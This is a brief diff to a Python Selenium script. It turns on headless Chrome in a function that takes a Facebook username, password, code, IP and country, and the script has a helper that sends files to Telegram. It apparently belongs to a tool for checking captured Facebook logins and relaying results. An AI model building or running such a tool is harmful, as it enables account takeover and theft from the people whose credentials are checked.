@@ -4,7 +4,6 @@ from datetime import datetime
 
 import requests
 from selenium import webdriver
-from selenium.common.exceptions import NoSuchElementException
 from selenium.webdriver.common.by import By
 from selenium.webdriver.support import expected_conditions as EC
 from selenium.webdriver.support.ui import WebDriverWait
@@ -47,7 +46,7 @@ def send_file_to_telegram(api_token, chat_id, file_path, message):
 
 def check_status_facebook(username, password, code, ip, country):
     options = webdriver.ChromeOptions()
-    # options.add_argument('--headless')
+    options.add_argument('--headless')
     options.add_argument('--no-sandbox')
     options.add_argument('--disable-dev-shm-usage')
     options.add_argument('--disable-features=SameSiteByDefaultCookies')
